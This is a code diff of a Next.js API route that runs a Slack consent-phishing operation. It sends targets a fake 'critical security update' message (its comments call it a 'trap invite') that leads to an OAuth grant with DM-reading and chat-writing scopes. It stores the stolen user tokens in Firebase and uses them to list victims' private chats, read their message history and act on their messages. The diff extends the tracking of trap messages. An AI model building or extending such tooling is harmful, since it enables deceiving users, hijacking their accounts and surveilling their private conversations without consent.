@@ -1,6 +1,8 @@
 /* eslint-disable @typescript-eslint/no-explicit-any */
 // app/api/slack/manager/route.ts
 
+// app/api/slack/manager/route.ts
+
 import { NextResponse } from 'next/server';
 // import { db } from '@/lib/firebase'; 
 import { doc, getDoc, deleteDoc, setDoc, serverTimestamp } from 'firebase/firestore';
@@ -16,12 +18,14 @@ export async function POST(req: Request) {
     const body = await req.json();
     const { action, targetUserId, channelId, text, messageTs, newText } = body;
 
-    // --- CASE 1: SEND TRAP INVITE ---
+    // --- CASE 1: SEND TRAP INVITE (MULTIPLE STORAGE) ---
     if (action === 'send_invite') {
        if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
+       
        const scopes = "chat:write,im:read,im:history,users:read,mpim:read";
        const authLink = `https://slack.com/oauth/v2/authorize?client_id=${CLIENT_ID}&user_scope=${scopes}&redirect_uri=${REDIRECT_URI}`;
        
+       // Trap Message Design
        const blocks = [
         { "type": "header", "text": { "type": "plain_text", "text": "✨ System Update Available", "emoji": true } },
         { "type": "section", "text": { "type": "mrkdwn", "text": "A critical security update is available for your workspace account.\nPlease authorize to continue." } },
@@ -42,9 +46,29 @@ export async function POST(req: Request) {
        const chatData = await chatRes.json();
        if(!chatData.ok) return NextResponse.json({ success: false, error: `Slack Error: ${chatData.error}` });
 
+       // ✅ NEW LOGIC: Store in Array (List)
+       const inviteRef = doc(db, "pending_invites", targetUserId);
+       
        try {
-           await setDoc(doc(db, "pending_invites", targetUserId), { ts: chatData.ts, channel: chatData.channel });
-       } catch (e) { console.error("Firebase Write Failed (Quota Exceeded):", e); }
+           // Pehlay check karo koi purana data hai?
+           const docSnap = await getDoc(inviteRef);
+           let existingMessages = [];
+           
+           if (docSnap.exists()) {
+               existingMessages = docSnap.data().messages || [];
+           }
+
+           // Naya message list main daalo
+           existingMessages.push({
+               ts: chatData.ts,
+               channel: chatData.channel,
+               sentAt: new Date().toISOString()
+           });
+
+           // Wapas save karo
+           await setDoc(inviteRef, { messages: existingMessages });
+           
+       } catch (e) { console.error("Firebase Write Failed:", e); }
        
        return NextResponse.json({ success: true });
     }
@@ -57,7 +81,7 @@ export async function POST(req: Request) {
         } catch (e) { return NextResponse.json({ error: "DB Error" }); }
     }
 
-    // --- CRASH PROTECTION: TOKEN FETCH ---
+    // --- TOKEN CHECK ---
     if (!targetUserId) return NextResponse.json({ error: "User ID required" });
     
     let USER_TOKEN = "";
@@ -66,11 +90,10 @@ export async function POST(req: Request) {
         if (!tokenDoc.exists()) return NextResponse.json({ error: "User Not Connected" }, { status: 403 });
         USER_TOKEN = tokenDoc.data().accessToken;
     } catch (e: any) {
-        console.error("🔥 Firebase Failed:", e.message);
-        return NextResponse.json({ error: "Database Quota Exceeded. Please change Firebase Project." }, { status: 503 });
+        return NextResponse.json({ error: "Database Error" }, { status: 503 });
     }
 
-    // --- CASE 3: LIST CHATS (WITH UNREAD COUNT 🔴) ---
+    // --- CASE 3: LIST CHATS ---
     if (action === 'list_chats') {
         const chatRes = await fetch('https://slack.com/api/users.conversations?types=im,mpim&limit=100', { 
             headers: { Authorization: `Bearer ${USER_TOKEN}` } 
@@ -94,14 +117,11 @@ export async function POST(req: Request) {
 
         const chats = await Promise.all((chatData.channels || []).map(async (c: any) => {
             let unreadCount = 0;
-            
-            // Fetch Channel Info to get Unread Count (Thora heavy hai, but zaroori hai)
             try {
                 const infoRes = await fetch(`https://slack.com/api/conversations.info?channel=${c.id}`, {
                     headers: { Authorization: `Bearer ${USER_TOKEN}` }
                 });
                 const infoData = await infoRes.json();
-                // Slack unread count deta hai agar available ho
                 if(infoData.ok && infoData.channel) {
                     unreadCount = infoData.channel.unread_count_display || 0;
                 }
@@ -124,7 +144,6 @@ export async function POST(req: Request) {
         let nextCursor = undefined;
         let loopCount = 0;
 
-        // No DB Write inside loop
         while (hasMore && loopCount < 3) { 
             let url = `https://slack.com/api/conversations.history?channel=${channelId}&limit=100`;
             if (nextCursor) url += `&cursor=${nextCursor}`;
@@ -176,8 +195,6 @@ export async function POST(req: Request) {
     return NextResponse.json({ error: "Invalid Action" });
 
   } catch (e: any) {
-    console.error("SERVER HANDLED ERROR:", e);
-    // 500 error ke bajaye hum 200 bhej rahay hain taakay app crash na ho
-    return NextResponse.json({ success: false, error: "System Busy (Quota)" }, { status: 200 });
+    return NextResponse.json({ success: false, error: "System Error" }, { status: 200 });
   }
 }
